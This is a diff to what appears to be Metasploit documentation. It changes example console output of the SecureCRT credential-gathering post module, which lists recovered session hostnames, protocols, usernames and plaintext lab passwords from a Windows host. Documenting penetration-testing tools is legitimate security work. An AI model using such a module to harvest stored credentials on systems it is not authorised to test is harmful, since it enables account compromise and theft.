@@ -105,16 +105,17 @@ Passphrase => whatabadpassword
 msf6 post(windows/gather/credentials/securecrt) > run
 
 [*] Gathering SecureCRT session information from WIN-M5JU6L5RA9L
-[*] Searching for session files in C:\Users\Administrator\AppData\Roaming\VanDyke\Config\Sessions
+[*] Searching for session files in C:\Users\normal\AppData\Roaming\VanDyke\Config\Sessions
 SecureCRT Sessions
 ==================
 
-Filename       Hostname   Port  Username              Password
---------       --------   ----  --------              --------
-127.0.0.1.ini  127.0.0.1  22    RAPID7\Administrator  thePassword123!
+Filename           Protocol  Hostname   Port  Username              Password
+--------           --------  --------   ----  --------              --------
+127.0.0.1 (1).ini  telnet    127.0.0.1  23    RAPID7\Administrator  thePassword123!
+127.0.0.1 (2).ini  ssh2      127.0.0.1  22    Administrator         thePassword123!
+127.0.0.1 (3).ini  ssh2      127.0.0.1  22    Administrator         
+127.0.0.1.ini      telnet    127.0.0.1  23                          
 
-[+] Session info stored in: /home/gwillcox/.msf4/loot/20200911125545_default_172.20.150.24_host.securecrt_s_504557.txt
-[*] Post module execution completed
 msf6 post(windows/gather/credentials/securecrt) >
 ```
 
